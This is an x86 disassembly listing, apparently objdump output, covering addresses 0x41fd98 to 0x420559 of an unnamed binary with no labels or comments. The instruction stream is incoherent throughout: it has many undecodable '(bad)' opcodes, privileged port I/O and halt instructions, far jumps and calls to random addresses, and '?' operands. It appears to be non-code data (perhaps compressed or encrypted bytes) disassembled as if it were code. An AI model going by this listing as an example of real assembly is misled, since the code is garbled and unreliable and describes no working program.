  41fd98:	dec    esi
  41fd99:	test   BYTE PTR [ebx+0xd],bl
  41fd9c:	jecxz  0x41fd51
  41fd9e:	test   DWORD PTR [ecx+0x28],ebx
  41fda1:	leave  
  41fda2:	sub    eax,0xb7de42c7
  41fda7:	mov    cl,BYTE PTR [esi+0x6d]
  41fdaa:	shl    ah,cl
  41fdac:	or     esi,DWORD PTR [ecx]
  41fdae:	sbb    ah,BYTE PTR [ecx+0x376a6467]
  41fdb4:	jno    0x41fd53
  41fdb6:	or     al,0x7b
  41fdb8:	mov    dl,BYTE PTR [eax-0x6a850f87]
  41fdbe:	in     al,dx
  41fdbf:	jecxz  0x41fddd
  41fdc1:	or     ebp,DWORD PTR ds:0xe4632519
  41fdc7:	loope  0x41fda5
  41fdc9:	popa   
  41fdca:	sbb    al,0xb6
  41fdcc:	xchg   edx,eax
  41fdcd:	fadd   st(1),st
  41fdcf:	adc    bh,dl
  41fdd1:	and    ah,BYTE PTR [ebx]
  41fdd3:	cli    
  41fdd4:	jb     0x41fd8d
  41fdd6:	ucomiss xmm6,DWORD PTR [edi+eiz*4+0x69cc5952]
  41fdde:	and    ah,BYTE PTR [ecx+0x1a6dc67b]
  41fde4:	gs cmc 
  41fde6:	call   0x39892142
  41fdeb:	cmp    esp,ebp
  41fded:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fdee:	push   cs
  41fdef:	pop    ds
  41fdf0:	cmc    
  41fdf1:	push   ds
  41fdf2:	stc    
  41fdf3:	lock jp 0x41fdc6
  41fdf6:	cmp    esp,esi
  41fdf8:	mov    cl,0x52
  41fdfa:	mov    ah,0x52
  41fdfc:	cmp    ah,dh
  41fdfe:	enter  0x8dac,0x94
  41fe02:	xlat   BYTE PTR ds:[ebx]
  41fe03:	xchg   ebp,eax
  41fe04:	inc    ecx
  41fe05:	repz popa 
  41fe07:	and    DWORD PTR [ecx],ecx
  41fe09:	pop    esi
  41fe0a:	das    
  41fe0b:	inc    esp
  41fe0c:	pushf  
  41fe0d:	call   0xeb85:0x86ebf653
  41fe14:	adc    eax,0x360dbf2b
  41fe19:	dec    edi
  41fe1a:	xor    DWORD PTR [ebx],0x564465e4
  41fe20:	(bad)  
  41fe22:	xchg   esi,eax
  41fe23:	inc    esi
  41fe24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe25:	sahf   
  41fe26:	sub    bl,BYTE PTR [ecx-0x60b62fd3]
  41fe2c:	mov    eax,0x2b703e91
  41fe31:	mov    cl,BYTE PTR [ebx+0x52]
  41fe34:	jmp    0xa0f84ecb
  41fe39:	in     eax,dx
  41fe3a:	push   0xa881fd6
  41fe3f:	push   0x59
  41fe41:	jge    0x16c4f7d
  41fe47:	cmp    esp,DWORD PTR [edi+0x3d]
  41fe4a:	mov    ch,0x7a
  41fe4c:	mov    al,0x6e
  41fe4e:	and    ch,ch
  41fe50:	mov    esi,0xd3e73dbd
  41fe55:	cmp    edi,DWORD PTR [esi+0x4408a27d]
  41fe5b:	dec    edx
  41fe5c:	mov    ds:0x7fe58a70,al
  41fe61:	pop    ebp
  41fe62:	enter  0x981b,0xfe
  41fe66:	inc    ebp
  41fe67:	mov    al,ds:0x4b923578
  41fe6c:	xchg   dh,bh
  41fe6e:	or     edi,ebx
  41fe70:	push   ebx
  41fe71:	in     al,dx
  41fe72:	push   edi
  41fe73:	cs (bad) 
  41fe75:	adc    eax,0xee7a305
  41fe7a:	pop    esp
  41fe7b:	aad    0xca
  41fe7d:	and    bh,cl
  41fe7f:	xchg   edi,eax
  41fe80:	mov    ?,WORD PTR [eax-0x6f]
  41fe83:	cld    
  41fe84:	cmp    al,BYTE PTR [esi+edx*2+0x1e]
  41fe88:	leave  
  41fe89:	loopne 0x41fe58
  41fe8b:	call   DWORD PTR [ebx-0x33]
  41fe8e:	and    ebp,0xdda6143a
  41fe94:	(bad)
  41fe97:	sbb    eax,0x8d9dca9b
  41fe9c:	add    eax,0xa48a528f
  41fea1:	sub    al,0xcf
  41fea3:	xchg   ecx,eax
  41fea4:	xlat   BYTE PTR ds:[ebx]
  41fea5:	xchg   ebp,eax
  41fea6:	pop    edx
  41fea7:	imul   cl
  41fea9:	sub    edi,esi
  41feab:	fwait
  41feac:	jge    0x41fedc
  41feae:	loope  0x41fee5
  41feb0:	nop
  41feb1:	(bad)  
  41feb2:	jmp    0xa174:0x4b1dae4b
  41feb9:	push   eax
  41feba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41febb:	outs   dx,DWORD PTR ds:[esi]
  41febc:	jae    0x41ff05
  41febe:	inc    ebp
  41febf:	out    0xd9,eax
  41fec1:	add    al,0x63
  41fec3:	sahf   
  41fec4:	and    DWORD PTR [esi],0xffffff95
  41fec7:	test   eax,0x98633259
  41fecc:	clc    
  41fecd:	out    dx,eax
  41fece:	adc    BYTE PTR [eax+0x64df77b1],dl
  41fed4:	jmp    0x3eae13be
  41fed9:	arpl   WORD PTR [esi-0x75],di
  41fedc:	loop   0x41fe6f
  41fede:	(bad)  
  41fedf:	es adc eax,0x3f4ae81
  41fee5:	jmp    0x41ff5d
  41fee7:	cld    
  41fee8:	mul    DWORD PTR [esi-0x36a52dc6]
  41feee:	inc    esi
  41feef:	dec    ebp
  41fef0:	sbb    eax,0xbd1716c3
  41fef5:	js     0x41fecb
  41fef7:	dec    edx
  41fef8:	ror    BYTE PTR [esi+0x48e345cf],cl
  41fefe:	cmp    BYTE PTR [ebx],dl
  41ff00:	xor    al,0x6e
  41ff02:	pop    es
  41ff03:	pop    ebx
  41ff04:	mov    ebx,0x7f897c89
  41ff09:	pop    esp
  41ff0a:	jp     0x41fef3
  41ff0c:	push   ds
  41ff0d:	xor    BYTE PTR [ebx-0x58a1ac03],0xe7
  41ff14:	stos   BYTE PTR es:[edi],al
  41ff15:	xchg   edx,eax
  41ff16:	and    ebp,ecx
  41ff18:	and    al,0x5c
  41ff1a:	or     ah,BYTE PTR [esi-0x56]
  41ff1d:	pop    es
  41ff1e:	retf   0x1cc2
  41ff21:	fcomip st,st(1)
  41ff23:	sbb    ebp,edx
  41ff25:	data16 mov ds:0xfe7d6406,al
  41ff2b:	fldenv [ebx+0x7b]
  41ff2e:	fwait
  41ff2f:	out    dx,al
  41ff30:	jnp    0x41ff64
  41ff32:	dec    edi
  41ff33:	sbb    DWORD PTR [ebp+0x76],ecx
  41ff36:	jmp    0x41feef
  41ff38:	dec    edx
  41ff39:	mov    ebp,0xfb373f2d
  41ff3e:	push   ss
  41ff3f:	sub    bh,dl
  41ff41:	xchg   ebx,eax
  41ff42:	dec    ecx
  41ff43:	bnd jbe 0x41ff86
  41ff46:	pop    esi
  41ff47:	and    al,0x13
  41ff49:	inc    esi
  41ff4a:	xor    al,0xb4
  41ff4c:	dec    esi
  41ff4d:	push   ebx
  41ff4e:	cmp    al,0x9d
  41ff50:	and    al,0x42
  41ff52:	push   ss
  41ff53:	bound  edx,QWORD PTR [edi+0x3f]
  41ff56:	sbb    edx,DWORD PTR ds:0x41a7df07
  41ff5c:	dec    ebx
  41ff5d:	jmp    0xe719:0x1817e158
  41ff64:	in     al,0x7e
  41ff66:	(bad)  
  41ff67:	icebp  
  41ff68:	jno    0x41ffe7
  41ff6a:	pop    ds
  41ff6b:	hlt    
  41ff6c:	call   FWORD PTR [ebx]
  41ff6e:	jg     0x41ffac
  41ff70:	mov    ss,ebp
  41ff72:	mov    WORD PTR [edi+0x53],?
  41ff75:	jae    0x41ff16
  41ff77:	sbb    edx,esp
  41ff79:	push   0xffffffe2
  41ff7b:	fnsave [edx+0x4d]
  41ff7e:	sub    al,0x4b
  41ff81:	sbb    eax,0xaa669972
  41ff86:	ret    0x1877
  41ff89:	xchg   edi,eax
  41ff8a:	jae    0x41ff1a
  41ff8c:	push   ebx
  41ff8d:	(bad)  
  41ff8e:	dec    edx
  41ff8f:	inc    esp
  41ff90:	mov    DWORD PTR [edi+0x7fef5a00],eax
  41ff96:	mov    edi,0xffc32183
  41ff9b:	xchg   DWORD PTR [esi],eax
  41ff9d:	pusha  
  41ff9e:	mov    ds:0x58a0d964,al
  41ffa3:	fldenv [ecx]
  41ffa5:	mov    esp,DWORD PTR [esi+0x5b]
  41ffa8:	push   ebp
  41ffa9:	jae    0x41ffb8
  41ffab:	mov    eax,ds:0xf2b93c05
  41ffb0:	inc    edx
  41ffb1:	mov    ah,0x73
  41ffb3:	sbb    BYTE PTR [ecx+0x5b],0x41
  41ffb7:	cmc    
  41ffb8:	or     al,0xfd
  41ffba:	loopne 0x41ffa1
  41ffbc:	sar    BYTE PTR [edx-0x7d1b412d],cl
  41ffc2:	inc    eax
  41ffc3:	sbb    dl,ah
  41ffc5:	mov    eax,ds:0x3f2914db
  41ffca:	imul   esi,DWORD PTR [ecx+0x28],0x25817750
  41ffd1:	xchg   ebp,eax
  41ffd2:	adc    esi,DWORD PTR [eax+0x79f86c27]
  41ffd8:	sub    dh,0x41
  41ffdb:	mov    edi,0x93aa4fde
  41ffe0:	mov    esi,0xe9c5eb68
  41ffe5:	lds    eax,FWORD PTR [ebx-0x13ea93ca]
  41ffeb:	xor    ebp,DWORD PTR [esi+0x4b]
  41ffee:	mov    al,dl
  41fff0:	mov    BYTE PTR ds:0x9cdbade2,0xde
  41fff7:	jbe    0x420007
  41fff9:	jmp    0x833e19a4
  41fffe:	mov    DWORD PTR [edx],esp
  420000:	mov    edi,0xb088d683
  420005:	dec    edi
  420006:	mov    eax,ds:0x8ad31dab
  42000b:	add    DWORD PTR [edi],edx
  42000d:	pop    eax
  42000e:	mov    ecx,0xfd86b84c
  420013:	dec    edi
  420014:	adc    ah,BYTE PTR [ecx+0x72]
  420017:	aam    0x8d
  420019:	fcomip st,st(1)
  42001b:	sub    edx,edx
  42001d:	hlt    
  42001e:	add    BYTE PTR [edx-0x50],al
  420021:	jecxz  0x42000b
  420023:	mov    al,ds:0x65983a6f
  420028:	(bad)  
  420029:	sar    DWORD PTR [ebx+0x1f1ac0f3],cl
  42002f:	sbb    edx,edi
  420031:	push   ds
  420032:	xchg   esi,eax
  420033:	xchg   edx,eax
  420034:	adc    DWORD PTR [eax],esp
  420036:	out    dx,eax
  420037:	repnz cwde 
  420039:	mov    dh,BYTE PTR [esi]
  42003b:	and    BYTE PTR [ebx-0x45812d76],al
  420041:	hlt    
  420042:	or     eax,0x8924d9eb
  420047:	mov    esp,0xe1ecdf65
  42004c:	sahf   
  42004d:	pop    ecx
  42004e:	jo     0x420015
  420050:	leave  
  420051:	ja     0x41ffdc
  420053:	pusha  
  420054:	jg     0x420058
  420056:	out    0x56,al
  420058:	stos   BYTE PTR es:[edi],al
  420059:	pushf  
  42005a:	or     ch,BYTE PTR [esi+0x21722f6d]
  420060:	sar    DWORD PTR [edx+0x2e6846dc],1
  420066:	loope  0x420056
  420068:	dec    DWORD PTR [esi]
  42006a:	jno    0x420070
  42006c:	add    DWORD PTR [edi-0x3b],0xb04349df
  420073:	jmp    0x41fff9
  420075:	ss (bad) 
  420078:	mov    cl,0x15
  42007a:	or     bh,BYTE PTR [ecx]
  42007c:	and    bh,al
  42007e:	or     ah,cl
  420080:	pop    ecx
  420081:	jle    0x4200dc
  420083:	push   ecx
  420084:	ja     0x420091
  420086:	and    edi,DWORD PTR [edx+0x5a0028d7]
  42008c:	repnz scas al,BYTE PTR es:[edi]
  42008e:	pop    ebx
  42008f:	jp     0x42001b
  420091:	pop    ebp
  420092:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420093:	inc    esi
  420094:	cmp    BYTE PTR [ecx-0x3f],bl
  420097:	es gs xchg ebp,ecx
  42009b:	imul   ebp,DWORD PTR ds:0xfde0374e,0xffffffc6
  4200a2:	jae    0x4200b4
  4200a4:	mov    esp,0x3518dc84
  4200a9:	popf   
  4200aa:	pop    eax
  4200ab:	push   esi
  4200ac:	shr    DWORD PTR [ebx],0xda
  4200af:	mov    fs,WORD PTR [esi+0x5e]
  4200b2:	int3   
  4200b3:	clc    
  4200b4:	(bad)  
  4200b5:	mov    WORD PTR [ebp-0x36e9d576],ss
  4200bb:	sbb    al,0x9a
  4200bd:	sub    al,0x81
  4200bf:	out    0xff,eax
  4200c1:	pop    esp
  4200c2:	repz cmp ch,BYTE PTR [ecx]
  4200c5:	add    al,BYTE PTR [eax]
  4200c7:	fsin   
  4200c9:	push   esi
  4200ca:	jnp    0x4200c8
  4200cc:	mov    bl,0xa3
  4200ce:	cmp    eax,0xfcebcbf0
  4200d3:	loope  0x4200c1
  4200d5:	hlt    
  4200d6:	std    
  4200d7:	cmp    dh,BYTE PTR [ebp-0x3ff1b1bb]
  4200dd:	xor    ecx,DWORD PTR [edx]
  4200df:	retf   
  4200e0:	xchg   DWORD PTR [ebp-0x41],edi
  4200e3:	mov    WORD PTR [ecx+ecx*1+0x6a],?
  4200e7:	and    ebx,DWORD PTR [ebp+edx*4-0x4c8f496f]
  4200ee:	mov    bl,0xfb
  4200f0:	sahf   
  4200f1:	fimul  WORD PTR [ebx]
  4200f3:	mov    ebp,ebx
  4200f5:	std    
  4200f6:	fstp   TBYTE PTR [ebx+ecx*2]
  4200f9:	lods   al,BYTE PTR ds:[esi]
  4200fa:	dec    esi
  4200fb:	(bad)  
  4200fc:	xchg   edi,eax
  4200fd:	xor    eax,0x1b0882ef
  420102:	je     0x42013e
  420104:	hlt    
  420105:	test   DWORD PTR [ebx+0x66eeea42],ebx
  42010b:	xor    DWORD PTR cs:[esi-0x5c],esi
  42010f:	dec    esp
  420110:	push   edi
  420111:	ins    BYTE PTR es:[edi],dx
  420112:	les    ebx,FWORD PTR [ebp+0x336838cf]
  420118:	in     eax,0xe3
  42011a:	adc    esi,esi
  42011c:	rcr    ebx,0xde
  42011f:	jle    0x420130
  420121:	aas    
  420122:	mov    ah,0x32
  420124:	xchg   esi,eax
  420125:	aad    0xcd
  420127:	jnp    0x42014d
  420129:	push   ebx
  42012a:	pop    esi
  42012b:	push   edi
  42012c:	loop   0x4200e0
  42012e:	sub    ch,BYTE PTR [bx+di]
  420131:	ja     0x420127
  420133:	ret    0xb40e
  420136:	imul   esi,ecx,0xffffffb9
  420139:	xchg   edi,eax
  42013a:	add    BYTE PTR [esi+edx*2],ch
  42013d:	mov    cl,BYTE PTR [eax+0x4819a432]
  420143:	nop
  420144:	lods   al,BYTE PTR ds:[esi]
  420145:	imul   ebx,DWORD PTR [ebx-0x60],0x6477e34e
  42014c:	dec    ecx
  42014d:	es ja  0x420160
  420150:	push   edi
  420151:	out    dx,eax
  420152:	fstp   TBYTE PTR cs:[edx-0x446bd456]
  420159:	xor    al,0x7d
  42015b:	mov    ecx,0xf0bb5a5f
  420160:	mov    al,ds:0xf9148b0c
  420165:	je     0x42013a
  420167:	in     eax,0x92
  420169:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42016a:	jno    0x42011f
  42016c:	adc    cl,BYTE PTR [edi-0x44e2561a]
  420172:	jnp    0x4201c3
  420174:	gs scas al,BYTE PTR es:[edi]
  420176:	call   FWORD PTR [ebx]
  420178:	mov    ds:0x4648aabc,eax
  42017d:	neg    eax
  42017f:	inc    edx
  420180:	(bad)  
  420181:	jne    0x4201c4
  420183:	or     al,0x3e
  420185:	xchg   ebx,eax
  420186:	inc    esi
  420187:	xor    BYTE PTR [edx-0x1ba2af6a],bl
  42018d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42018e:	outs   dx,DWORD PTR ds:[esi]
  42018f:	push   0x4e36550e
  420194:	cmp    DWORD PTR [edi+0x136b724b],edi
  42019a:	and    DWORD PTR [eax+edx*8],0xffffffb8
  42019e:	dec    esi
  42019f:	sahf   
  4201a0:	(bad)  
  4201a1:	mov    eax,0x47299403
  4201a6:	cwde   
  4201a7:	hlt    
  4201a8:	sbb    edi,ebp
  4201aa:	pop    ds
  4201ab:	sbb    al,0xe6
  4201ad:	jle    0x4201e4
  4201af:	pop    es
  4201b0:	cmp    al,0x59
  4201b2:	xor    al,0x9a
  4201b4:	call   0xd7e983be
  4201b9:	jecxz  0x420173
  4201bb:	cli    
  4201bc:	jl     0x4201e9
  4201be:	and    esi,DWORD PTR [edx]
  4201c0:	(bad)  
  4201c2:	inc    eax
  4201c3:	inc    edx
  4201c4:	int3   
  4201c5:	js     0x420234
  4201c7:	xchg   DWORD PTR [ebx],esi
  4201c9:	mov    WORD PTR [edi],es
  4201cb:	inc    eax
  4201cc:	push   0x75
  4201ce:	in     eax,dx
  4201cf:	gs loopne 0x42017e
  4201d2:	inc    edi
  4201d3:	arpl   WORD PTR [ecx-0x27],di
  4201d6:	in     al,dx
  4201d7:	sbb    ecx,DWORD PTR [esi-0x18c7a2cc]
  4201dd:	inc    ebp
  4201de:	jp     0x420218
  4201e0:	jae    0x42020c
  4201e2:	(bad)  
  4201e3:	jo     0x420214
  4201e5:	cli    
  4201e6:	(bad)  
  4201e7:	pushf  
  4201e8:	push   ebp
  4201e9:	(bad)  
  4201ea:	pop    ebx
  4201eb:	lahf   
  4201ec:	(bad)  
  4201ed:	ja     0x420211
  4201ef:	in     al,0xa5
  4201f1:	dec    eax
  4201f2:	pop    edx
  4201f3:	add    al,0xed
  4201f5:	xlat   BYTE PTR ds:[ebx]
  4201f6:	data16 xor al,0x3
  4201f9:	outs   dx,DWORD PTR ds:[esi]
  4201fa:	sub    al,0xd9
  4201fc:	rcr    dh,cl
  4201fe:	or     DWORD PTR [ebp-0x61],edi
  420201:	and    eax,0x671782de
  420206:	test   cl,bl
  420208:	rcl    DWORD PTR [edi+0x634e7d7c],1
  42020e:	fild   QWORD PTR [ebx+0x702c4639]
  420214:	cmp    bl,BYTE PTR [edi]
  420216:	or     DWORD PTR [esi+0x66],edi
  420219:	jg     0x420234
  42021b:	popa   
  42021c:	test   esi,edi
  42021e:	xchg   ecx,eax
  42021f:	imul   DWORD PTR [ebp+0x45358340]
  420225:	push   ds
  420226:	dec    esp
  420227:	pop    esp
  420228:	inc    esi
  420229:	cmp    ah,al
  42022b:	push   esi
  42022c:	aad    0xa6
  42022e:	daa    
  42022f:	cmc    
  420230:	mov    ch,0xcb
  420232:	add    eax,0x77f6b190
  420237:	(bad)  
  420238:	in     eax,dx
  420239:	xchg   ebx,eax
  42023a:	sbb    esp,DWORD PTR [ecx+0x46]
  42023d:	in     eax,dx
  42023e:	pop    esi
  42023f:	js     0x420277
  420241:	pusha  
  420242:	xchg   ebp,eax
  420243:	in     al,dx
  420244:	push   edi
  420245:	sbb    cl,BYTE PTR [edi+0x1c]
  420248:	pop    ds
  420249:	push   ecx
  42024a:	repnz fnsave [edx+0x78]
  42024e:	xchg   esp,eax
  42024f:	mov    ebx,0xd9f93d91
  420254:	and    DWORD PTR ds:0x6b8f7881,ecx
  42025a:	xchg   DWORD PTR [ebp-0x74],edi
  42025d:	dec    BYTE PTR [edx]
  42025f:	mov    eax,ds:0x3c8661fa
  420264:	stc    
  420265:	sbb    DWORD PTR [edx],esp
  420267:	and    al,0x5e
  420269:	xchg   ecx,eax
  42026a:	push   ebp
  42026b:	fwait
  42026c:	rcr    BYTE PTR [edx+0x7b],cl
  42026f:	sbb    DWORD PTR [edx+0x2d],edx
  420272:	in     al,dx
  420273:	shl    BYTE PTR [edx+0x5622060b],0xd5
  42027a:	daa    
  42027b:	rol    ah,cl
  42027d:	add    al,BYTE PTR [ebp+edx*1+0x5b5d9dd2]
  420284:	pop    ds
  420285:	xadd   DWORD PTR [ecx],edi
  420288:	or     DWORD PTR [esi-0x18],ebp
  42028b:	cmp    BYTE PTR [ebx],ch
  42028d:	jle    0x4202b1
  42028f:	adc    ch,al
  420291:	add    DWORD PTR [ecx-0x7b79fdaf],esp
  420297:	sub    ebp,DWORD PTR [ecx]
  420299:	ret    
  42029a:	cmp    ah,BYTE PTR ds:0xb2194dd
  4202a0:	adc    eax,0x9b04fd70
  4202a5:	pop    edi
  4202a6:	leave  
  4202a7:	mov    ecx,0x5e92dc13
  4202ac:	leave  
  4202ad:	inc    esi
  4202ae:	inc    edx
  4202af:	sbb    al,0x58
  4202b1:	pop    ss
  4202b2:	clc    
  4202b3:	mov    ebp,0xcc8ab17d
  4202b8:	push   cs
  4202b9:	call   0x2300c50e
  4202be:	cmp    al,0xb3
  4202c0:	mul    DWORD PTR [ebx+ebp*4]
  4202c3:	dec    eax
  4202c4:	pop    ds
  4202c5:	mov    ds:0x8c5fd9b7,al
  4202ca:	xor    al,ah
  4202cc:	scas   al,BYTE PTR es:[edi]
  4202cd:	mov    ecx,0x23457c49
  4202d2:	xchg   edx,eax
  4202d3:	gs jae 0x4202f8
  4202d6:	dec    esi
  4202d7:	not    bp
  4202da:	add    edx,ecx
  4202dc:	in     al,0x6
  4202de:	(bad)  
  4202df:	fnsave [edi+0x18]
  4202e2:	js     0x420330
  4202e4:	lds    esp,FWORD PTR [ebp+0x28]
  4202e7:	xor    DWORD PTR ds:0xba2b452,0xffffffc1
  4202ee:	and    al,0x79
  4202f0:	pop    es
  4202f1:	arpl   WORD PTR [edx],cx
  4202f3:	aaa    
  4202f4:	das    
  4202f5:	sub    eax,0xc3e08ff0
  4202fa:	adc    eax,DWORD PTR [ebx-0x2e]
  4202fd:	inc    esp
  4202fe:	jae    0x4202a2
  420300:	mov    edi,DWORD PTR [ecx]
  420302:	jmp    0x159a:0x667bd6f5
  420309:	mov    ecx,0xce813870
  42030e:	je     0x42029a
  420310:	dec    edx
  420311:	(bad)  
  420312:	mov    ah,0x40
  420314:	cmp    ch,ah
  420316:	ja     0x4202ce
  420318:	pop    eax
  420319:	xor    eax,0xbe67e883
  42031e:	mov    edi,0x150c45
  420323:	jns    0x42030b
  420325:	inc    edi
  420326:	mov    eax,ds:0x45a5063f
  42032b:	sbb    DWORD PTR [edx+0x63],esi
  42032e:	mov    al,fs:0x67f57ff9
  420334:	div    al
  420336:	pusha  
  420337:	fsubrp st(3),st
  420339:	fstp   DWORD PTR [eax+ebx*4]
  42033c:	repz jno 0x42037f
  42033f:	fsub   DWORD PTR [ebx+0x5c]
  420342:	icebp  
  420343:	inc    esi
  420344:	and    BYTE PTR [edx-0x4c78ec07],0xea
  42034b:	jp     0x42038d
  42034d:	jo     0x4203b4
  42034f:	pop    ds
  420350:	sti    
  420351:	xchg   ebx,eax
  420352:	jge    0x4202fc
  420354:	retf   
  420355:	(bad)  
  420356:	mov    esp,0x54f4d74c
  42035b:	outs   dx,DWORD PTR ds:[esi]
  42035c:	dec    edx
  42035d:	sub    al,0x91
  42035f:	(bad)  
  420360:	pop    eax
  420361:	push   ebp
  420362:	pop    edi
  420363:	loope  0x4202ee
  420365:	jmp    0x485c:0x1b9b96d
  42036c:	add    al,0xe9
  42036e:	inc    ecx
  42036f:	sbb    BYTE PTR gs:[ebp-0x2e4ac65b],dl
  420376:	push   eax
  420377:	pop    ebp
  420378:	ficomp DWORD PTR [esi-0x3b91d42e]
  42037e:	mov    esp,0xaeafb111
  420383:	and    edi,DWORD PTR [edx+0x2af92f90]
  420389:	mov    esp,0xa2fc320e
  42038e:	or     BYTE PTR [eax+0x2c],ch
  420391:	adc    ebp,ebx
  420393:	jne    0x420370
  420395:	imul   esi,esp,0x6
  420398:	daa    
  420399:	push   ebx
  42039a:	dec    ebp
  42039b:	in     al,dx
  42039c:	inc    esp
  42039d:	(bad)  
  42039e:	cmp    eax,0xb0c888ba
  4203a3:	js     0x4203c9
  4203a5:	jmp    0x42ac:0xe079e2f9
  4203ac:	jmp    0xa5ae6351
  4203b1:	je     0x420365
  4203b3:	lds    ebp,FWORD PTR [edx+eax*8]
  4203b6:	out    dx,al
  4203b7:	aaa    
  4203b8:	loope  0x420408
  4203ba:	xchg   ebp,eax
  4203bb:	ins    DWORD PTR es:[edi],dx
  4203bc:	lock xchg edi,eax
  4203be:	mov    al,ds:0xb3fa558b
  4203c3:	call   0x764ff0e7
  4203c8:	adc    eax,0x86f95016
  4203cd:	mov    ecx,0x4ed0530f
  4203d2:	test   ecx,esp
  4203d4:	stos   DWORD PTR es:[edi],eax
  4203d5:	in     eax,0x86
  4203d7:	push   0x5972c0f2
  4203dc:	mov    edx,0x2266f735
  4203e1:	and    cl,BYTE PTR [ecx+0x52496019]
  4203e7:	xchg   edi,eax
  4203e8:	pop    eax
  4203e9:	inc    ebp
  4203ea:	and    esi,0xffffffea
  4203ed:	push   esi
  4203ee:	test   DWORD PTR [ebx],0x5f9248e6
  4203f4:	pop    ecx
  4203f5:	mov    ecx,0xe5d306f
  4203fa:	lods   al,BYTE PTR ds:[esi]
  4203fb:	pop    ds
  4203fc:	adc    al,0xca
  4203fe:	xchg   ebx,eax
  4203ff:	into   
  420400:	jmp    0x42041f
  420402:	inc    esp
  420403:	mov    esi,0x5f1f0fc4
  420408:	mov    ch,0xf4
  42040a:	push   es
  42040b:	js     0x420438
  42040d:	and    eax,0x7022cdaf
  420412:	out    dx,al
  420413:	aad    0x64
  420415:	sbb    al,0xf5
  420417:	pushf  
  420418:	out    0x79,al
  42041a:	mov    bh,BYTE PTR [edi-0x48dca133]
  420420:	fbld   TBYTE PTR [eax]
  420422:	and    bh,ch
  420424:	retf   0x7d0a
  420427:	imul   edi,edi,0xffffffdd
  42042a:	xor    al,0xdd
  42042c:	adc    dl,bl
  42042e:	lods   al,BYTE PTR ds:[esi]
  42042f:	outs   dx,BYTE PTR ds:[esi]
  420430:	daa    
  420431:	cdq    
  420432:	ret    0xb556
  420435:	xchg   esi,eax
  420436:	push   0x5f0c3f24
  42043b:	sub    al,BYTE PTR [ebp+0x5459580d]
  420441:	leave  
  420442:	(bad)  [ecx+0x64]
  420445:	call   0x3acc:0xe4cd234f
  42044c:	jb     0x4203f8
  42044e:	add    al,0x33
  420450:	sbb    BYTE PTR [ecx+0x10],bl
  420453:	mov    eax,ds:0x8b6fb301
  420458:	rol    ecx,0xae
  42045b:	pop    edx
  42045c:	fldcw  WORD PTR [esi]
  42045e:	fmul   st(5),st
  420460:	stc    
  420461:	push   ecx
  420462:	jns    0x4203e6
  420464:	loopne 0x4203f7
  420466:	icebp  
  420467:	pop    ebx
  420468:	out    0x74,eax
  42046a:	sbb    DWORD PTR [eax],ebp
  42046c:	push   0xe214226f
  420471:	or     eax,0x8a143879
  420476:	inc    ebp
  420477:	test   BYTE PTR [esi+edx*8],dh
  42047a:	jmp    0x5ca085e1
  42047f:	div    bh
  420481:	adc    eax,0xf6b05b0f
  420486:	imul   edx,ebp,0xb5ba43fb
  42048c:	sar    BYTE PTR ds:0x7b445eaf,1
  420492:	cmp    ebx,ebp
  420494:	jbe    0x4204b6
  420496:	fistp  DWORD PTR [ebp-0x6d1f4d3f]
  42049c:	push   ecx
  42049d:	(bad)  
  42049e:	into   
  42049f:	shr    DWORD PTR [si-0x49],cl
  4204a3:	mov    al,0x17
  4204a5:	mov    ds:0x9ead9e99,eax
  4204aa:	adc    DWORD PTR [ebp-0x35],ebx
  4204ad:	(bad)  
  4204ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4204af:	aaa    
  4204b0:	pop    es
  4204b1:	inc    eax
  4204b2:	arpl   cx,si
  4204b4:	adc    al,0xed
  4204b6:	ror    BYTE PTR [edi],1
  4204b8:	fadd   DWORD PTR [eax]
  4204ba:	jle    0x4204b5
  4204bc:	cld    
  4204bd:	aam    0x22
  4204bf:	sti    
  4204c0:	call   0x10e0:0xa4eddfbc
  4204c7:	lahf   
  4204c8:	dec    esi
  4204c9:	cmp    al,0x54
  4204cb:	sti    
  4204cc:	add    esp,DWORD PTR [edi]
  4204ce:	adc    dh,BYTE PTR [esi]
  4204d0:	sbb    eax,0x31c6c587
  4204d5:	imul   ecx,DWORD PTR [edx+0x1ee3732],0x89078912
  4204df:	pop    ds
  4204e0:	sbb    eax,0x84c547e3
  4204e5:	mov    eax,DWORD PTR [ecx]
  4204e7:	and    al,0x5b
  4204e9:	mov    edi,0x361b6f8a
  4204ee:	fwait
  4204ef:	je     0x420540
  4204f1:	ret    
  4204f2:	mov    ecx,0x8c8dcf93
  4204f7:	gs scas al,BYTE PTR es:[edi]
  4204f9:	cs xchg ecx,eax
  4204fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4204fc:	sub    al,0x7
  4204fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4204ff:	daa    
  420500:	jno    0x4204df
  420502:	mov    ah,0x1e
  420504:	div    DWORD PTR cs:[ebx]
  420507:	in     al,0x50
  420509:	pop    es
  42050a:	bound  eax,QWORD PTR [edx-0x34]
  42050d:	mov    ecx,edi
  42050f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420510:	pop    ss
  420511:	and    eax,0x4f13e275
  420516:	and    bl,0xbd
  420519:	aaa    
  42051a:	and    bh,BYTE PTR [esi+0x2fc01db]
  420520:	pop    ds
  420521:	push   edi
  420522:	jns    0x420574
  420524:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420525:	push   ecx
  420526:	jle    0x4204ff
  420528:	push   ecx
  420529:	mov    edi,0xb2334ddf
  42052e:	mov    dl,0x3f
  420530:	mov    ?,WORD PTR [ebx+eiz*2+0x1ea6d8b]
  420537:	inc    edx
  420538:	xlat   BYTE PTR ds:[ebx]
  420539:	mov    BYTE PTR [eax-0x7e],ah
  42053c:	pop    ss
  42053d:	fwait
  42053e:	pop    ds
  42053f:	cmp    BYTE PTR [ebp+0x76],dl
  420542:	push   esp
  420543:	les    esp,FWORD PTR [edi-0x41]
  420546:	jmp    0x420579
  420548:	icebp  
  420549:	jle    0x4205bd
  42054b:	mov    ch,0xd8
  42054d:	jl     0x4204d7
  42054f:	in     eax,0xf6
  420551:	sar    DWORD PTR ds:0x537717f1,cl
  420557:	mov    bh,0x41
  420559:	(bad)  
